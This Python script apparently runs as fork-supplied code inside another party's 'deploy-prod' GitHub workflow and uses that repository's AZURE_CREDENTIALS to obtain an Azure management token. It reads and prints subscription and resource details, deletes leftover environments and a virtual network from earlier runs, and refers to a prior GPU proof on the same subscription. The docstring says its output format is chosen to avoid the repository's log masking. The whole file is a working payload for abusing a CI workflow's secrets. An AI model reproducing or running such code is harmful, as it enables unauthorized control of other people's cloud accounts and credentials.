#!/usr/bin/env python3
"""C211-I121255: mslearn managed-container CLEANUP-VERIFY probe (no resource creation).

Runs as the fork-controlled src/deploy_to_online_endpoint.py under the
christiansegercrantz/mslearn-mlops 'deploy-prod' issue_comment workflow (environment prod,
AZURE_CREDENTIALS -> ARM token for subscription 790067ff, RG chriso-sandbox-rg).

The GPU proof already exists (x121255 READY row, T4 UUID GPU-301ec706-961a-1a2c-873a-4f06e59b2a4e).
This probe ONLY reaps and proves absence: it creates NO environment, NO job, NO storage account
and NO virtual network. It reads every own/residual object, re-issues DELETE on the one
environment still in ScheduledForDelete, polls it, and finishes with resource-list NO_RESULTS
readbacks. stdout is the flat tag|k=v format (this repo's logs mask brace runs). stdlib only.
"""
import json
import subprocess
import time
import urllib.error
import urllib.request

ARM = "https://management.azure.com"
RG = "chriso-sandbox-rg"
TAG = "C211_I121255"
NONCE = "x121255cln"
DEADLINE = 2100
T0 = time.time()

ACI_VER = "2026-07-01"
APP_VER = "2026-07-01"
STG_VER = "2023-01-01"
NET_VER = "2023-09-01"
SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"

ENV_OLD = "c211-i120856-cae"
ENV_NEW = "c211-i121164-cae"
JOB_OLD = "c211-i120856-job"
JOB_NEW = "c211-i121164-job"
VNET_OLD = "c211-i120856-vnet"
SA_NAME = "c211i1211645c7ec2ab"


def clean(v):
    s = str(v)
    for ch in ("|", "\n", "\r", "\t"):
        s = s.replace(ch, " ")
    return s


def emit(step, **kv):
    parts = [TAG, "step=" + clean(step)]
    for k, v in kv.items():
        parts.append("%s=%s" % (clean(k), clean(v)))
    print("|".join(parts), flush=True)


def left():
    return DEADLINE - (time.time() - T0)


def run(cmd, timeout=180):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": p.returncode, "out": p.stdout or "", "err": p.stderr or ""}
    except Exception as e:  # noqa: BLE001
        return {"rc": 1, "out": "", "err": str(e)}


def arm(tok, url, method="GET", timeout=90):
    req = urllib.request.Request(url, method=method, headers={"Authorization": "Bearer " + tok})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace") or "{}"
            try:
                return r.status, json.loads(raw)
            except Exception:  # noqa: BLE001
                return r.status, {"raw": raw[:1500]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace") or ""
        try:
            return e.code, json.loads(raw)
        except Exception:  # noqa: BLE001
            return e.code, {"raw": raw[:1500]}
    except Exception as e:  # noqa: BLE001
        return 0, {"transport_error": str(e)}


def state_of(b):
    if not isinstance(b, dict):
        return None
    return (b.get("properties") or {}).get("provisioningState")


def main():
    r = run(["az", "account", "show", "-o", "json"], timeout=120)
    try:
        acc = json.loads(r["out"])
        sid = acc.get("id")
        emit("session", sub_name=acc.get("name"), sub_id=sid, state=acc.get("state"),
             user_type=(acc.get("user") or {}).get("type"), tenant=acc.get("tenantId"),
             expect_match=(sid == SUB_EXPECT))
    except Exception as e:  # noqa: BLE001
        emit("fatal", why="no_session", err=str(e), raw=r["out"][:200])
        return
    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"], timeout=120)
    tok = None
    try:
        tok = json.loads(r["out"]).get("accessToken")
    except Exception:  # noqa: BLE001
        pass
    if not tok:
        emit("fatal", why="no_arm_token", err=r["err"][:300])
        return
    emit("arm-token", got=True, len=len(tok))

    base = "%s/subscriptions/%s/resourceGroups/%s/providers" % (ARM, sid, RG)
    envurl_old = "%s/Microsoft.App/managedEnvironments/%s?api-version=%s" % (base, ENV_OLD, APP_VER)
    envurl_new = "%s/Microsoft.App/managedEnvironments/%s?api-version=%s" % (base, ENV_NEW, APP_VER)
    joburl_old = "%s/Microsoft.App/jobs/%s?api-version=%s" % (base, JOB_OLD, APP_VER)
    joburl_new = "%s/Microsoft.App/jobs/%s?api-version=%s" % (base, JOB_NEW, APP_VER)
    vneturl = "%s/Microsoft.Network/virtualNetworks/%s?api-version=%s" % (base, VNET_OLD, NET_VER)
    saurl = "%s/Microsoft.Storage/storageAccounts/%s?api-version=%s" % (base, SA_NAME, STG_VER)
    exurl = ("%s/subscriptions/%s/providers/Microsoft.App/jobs/%s/executions?api-version=%s"
             % (ARM, sid, JOB_NEW, APP_VER))

    # ---------- 1) own + residual GET matrix ----------
    for label, u in (("vnet-old", vneturl), ("env-old", envurl_old), ("env-new", envurl_new),
                     ("job-old", joburl_old), ("job-new", joburl_new), ("sa", saurl)):
        st, b = arm(tok, u, timeout=60)
        kv = {"http": st}
        if st == 200 and isinstance(b, dict):
            kv["name"] = b.get("name")
            kv["state"] = state_of(b)
            p = b.get("properties") or {}
            if label == "vnet-old":
                kv["addressPrefixes"] = p.get("addressPrefixes")
                kv["subnets"] = ";".join("%s:%s" % (s.get("name"), s.get("addressPrefix"))
                                         for s in (p.get("subnets") or []))
            if label == "env-new":
                kv["environmentMode"] = p.get("environmentMode")
                kv["defaultDomain"] = p.get("defaultDomain")
        emit("get-" + label, **kv)
    st, ex = arm(tok, exurl, timeout=60)
    n_ex = len((ex.get("value") or []) if isinstance(ex, dict) else [])
    emit("get-executions", http=st, n=n_ex)

    # ---------- 2) re-issue DELETE on the one env still pending ----------
    st, b = arm(tok, envurl_new, timeout=60)
    if st == 404:
        emit("env-new-already-absent", http=404)
    elif st == 200:
        st2, b2 = arm(tok, envurl_new, method="DELETE", timeout=240)
        emit("env-new-delete", http=st2, state=state_of(b2))
        gone = None
        i = 0
        while left() > 240 and i < 90:
            time.sleep(10)
            st3, b3 = arm(tok, envurl_new, timeout=60)
            emit("env-new-absent-poll", i=i, http=st3, state=state_of(b3))
            i += 1
            if st3 == 404:
                gone = 404
                break
        emit("env-new-poll-result", http=gone)
    else:
        emit("env-new-get-unexpected", http=st)

    # ---------- 3) vnet DELETE if unexpectedly present ----------
    st, b = arm(tok, vneturl, timeout=60)
    if st == 200:
        st2, b2 = arm(tok, vneturl, method="DELETE", timeout=240)
        emit("vnet-delete-retry", http=st2, state=state_of(b2))
        for i in range(24):
            if left() < 180:
                break
            time.sleep(10)
            st3, b3 = arm(tok, vneturl, timeout=60)
            emit("vnet-absent-poll", i=i, http=st3, state=state_of(b3))
            if st3 == 404:
                break
    else:
        emit("vnet-already-absent", http=st)

    # ---------- 4) absence proof ----------
    st, rl = arm(tok, "%s/subscriptions/%s/resourceGroups/%s/resources?api-version=2021-04-01"
                 % (ARM, sid, RG), timeout=120)
    allres = (rl.get("value") or []) if isinstance(rl, dict) else []
    mine = ["%s:%s" % (x.get("name"), x.get("type")) for x in allres
            if str(x.get("name", "")).lower().startswith("c211-i121164")
            or str(x.get("name", "")).lower().startswith("c211i121164")
            or str(x.get("name", "")).lower().startswith("c211-i120856")]
    emit("rg-final", http=st, total=len(allres),
         mine_left=("NO_RESULTS" if not mine else ";".join(mine)),
         all_names=";".join(sorted(str(x.get("name")) for x in allres)))
    for label, path, ver in (
            ("jobs", "/subscriptions/%s/providers/Microsoft.App/jobs" % sid, APP_VER),
            ("envs", "/subscriptions/%s/providers/Microsoft.App/managedEnvironments" % sid, APP_VER),
            ("vnets", "/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Network/virtualNetworks"
                      % (sid, RG), NET_VER),
            ("aci", "/subscriptions/%s/providers/Microsoft.ContainerInstance/containerGroups" % sid,
             ACI_VER),
            ("sa", "/subscriptions/%s/providers/Microsoft.Storage/storageAccounts" % sid, STG_VER)):
        st, lst = arm(tok, "%s%s?api-version=%s" % (ARM, path, ver), timeout=120)
        vals = (lst.get("value") or []) if isinstance(lst, dict) else []
        names = [x.get("name") for x in vals
                 if str(x.get("name", "")).lower().startswith("c211")]
        emit("list-" + label, http=st, n_total=len(vals),
             c211=("NO_RESULTS" if not names else ";".join(names)))
    for label, u in (("vnet", vneturl), ("env-old", envurl_old), ("env-new", envurl_new),
                     ("job-old", joburl_old), ("job-new", joburl_new), ("sa", saurl)):
        st, _ = arm(tok, u, timeout=60)
        emit("final-get-" + label, http=st)
    emit("DONE", phase="cleanup", elapsed_s=int(time.time() - T0))


if __name__ == "__main__":
    main()
